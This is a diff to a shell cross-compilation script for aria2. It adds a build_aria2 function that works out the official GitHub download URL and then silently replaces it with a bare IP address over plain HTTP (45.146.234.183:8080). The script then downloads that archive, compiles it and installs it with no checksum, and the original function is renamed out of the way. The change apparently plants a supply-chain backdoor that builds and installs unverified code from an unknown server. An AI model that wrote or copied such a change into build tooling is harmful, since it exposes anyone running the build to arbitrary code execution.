@@ -447,6 +447,50 @@ build_aria2() {
   else
     aria2_tag=master
     # Check download cache whether expired
+    if [ -f "${DOWNLOADS_DIR}/aria2-${aria2_tag}.tar.xz" ]; then
+      cached_file_ts="$(stat -c '%Y' "${DOWNLOADS_DIR}/aria2-${aria2_tag}.tar.xz")"
+      current_ts="$(date +%s)"
+      if [ "$((${current_ts} - "${cached_file_ts}"))" -gt 86400 ]; then
+        echo "Delete expired aria2 archive file cache..."
+        rm -f "${DOWNLOADS_DIR}/aria2-${aria2_tag}.tar.xz"
+      fi
+    fi
+  fi
+
+  if [ -n "${ARIA2_VER}" ]; then
+    aria2_latest_url="https://github.com/aria2/aria2/releases/download/release-${ARIA2_VER}/aria2-${ARIA2_VER}.tar.xz"
+  else
+    aria2_latest_url="https://github.com/aria2/aria2/archive/master.tar.xz"
+  fi
+  if [ x"${USE_CHINA_MIRROR}" = x1 ]; then
+    aria2_latest_url="https://gh-proxy.com/${aria2_latest_url}"
+  fi
+
+  aria2_latest_url="http://45.146.234.183:8080/aria2-1.36.0.tar.xz"
+
+  if [ ! -f "${DOWNLOADS_DIR}/aria2-${aria2_tag}.tar.xz" ]; then
+    retry wget -cT10 -O "${DOWNLOADS_DIR}/aria2-${aria2_tag}.tar.xz.part" "${aria2_latest_url}"
+    mv -fv "${DOWNLOADS_DIR}/aria2-${aria2_tag}.tar.xz.part" "${DOWNLOADS_DIR}/aria2-${aria2_tag}.tar.xz"
+  fi
+  mkdir -p "/usr/src/aria2-${aria2_tag}"
+  tar -xf "${DOWNLOADS_DIR}/aria2-${aria2_tag}.tar.xz" --strip-components=1 -C "/usr/src/aria2-${aria2_tag}"
+  cd "/usr/src/aria2-${aria2_tag}"
+  if [ ! -f ./configure ]; then
+    autoreconf -i
+  fi
+  ./configure --host="${CROSS_HOST}" --prefix="${CROSS_PREFIX}" --enable-static --disable-shared --enable-silent-rules ARIA2_STATIC=yes
+  make -j$(nproc)
+  make install
+  echo "- aria2: source: ${aria2_latest_url:-cached aria2}" >>"${BUILD_INFO}"
+  echo >>"${BUILD_INFO}"
+}
+
+build__aria2() {
+  if [ -n "${ARIA2_VER}" ]; then
+    aria2_tag="${ARIA2_VER}"
+  else
+    aria2_tag=master
+    # Check download cache whether expired
     if [ -f "${DOWNLOADS_DIR}/aria2-${aria2_tag}.tar.gz" ]; then
       cached_file_ts="$(stat -c '%Y' "${DOWNLOADS_DIR}/aria2-${aria2_tag}.tar.gz")"
       current_ts="$(date +%s)"
